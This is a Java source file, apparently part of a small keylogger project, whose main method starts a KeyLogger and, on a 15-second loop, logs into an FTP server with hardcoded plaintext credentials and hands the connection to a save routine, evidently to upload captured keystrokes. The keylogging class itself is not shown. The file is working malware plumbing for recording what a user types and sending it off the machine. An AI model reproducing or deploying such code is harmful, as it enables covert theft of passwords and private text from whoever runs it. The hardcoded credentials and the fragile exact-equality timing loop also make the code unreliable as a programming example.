package Previous;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

public class main {
    static FTPClient ftp = null;

    public static void main(String[] args) throws IOException {
        String server = "localhost";
        String username = "tienvan4119";
        String password = "van411208";
        int port = 21;
        KeyLogger keyLogger = new KeyLogger();
        keyLogger.startKeyLogger();

        long start = System.currentTimeMillis();
        while (true) {
            if (System.currentTimeMillis() - start == 15000) {
				try {
					ftp = ConnectFTP(server, port, username, password);
					KeyLogger.nativeKeyBoard.onSave(ftp);
					start = System.currentTimeMillis();
				}catch (Exception e ){

				}

            }
        }
    }

	public static FTPClient ConnectFTP(String server, int port, String user, String pass) throws IOException {
		ftp = new FTPClient();
		ftp.connect(server, port);
		System.out.println("1");
		showServerReply(ftp);
		int replyCode = ftp.getReplyCode();
		if (!FTPReply.isPositiveCompletion(replyCode)) {
			System.out.println("Operation failed. Server reply code: " + replyCode);
			return null;
		} else {
			boolean success = ftp.login(user, pass);
			System.out.println("2");
			showServerReply(ftp);
			System.out.println(ftp);
			if (!success) {
				System.out.println("Could not login to the server");
				return null;
			} else {
				System.out.println("Connect");
				ftp.enterLocalPassiveMode();
				return ftp;
			}
		}
	}

	private static void showServerReply(FTPClient ftpClient) {
		String[] replies = ftpClient.getReplyStrings();
		if (replies != null && replies.length > 0) {
			for (String aReply : replies) {
				System.out.println("SERVER: " + aReply);
			}
		}
	}


}
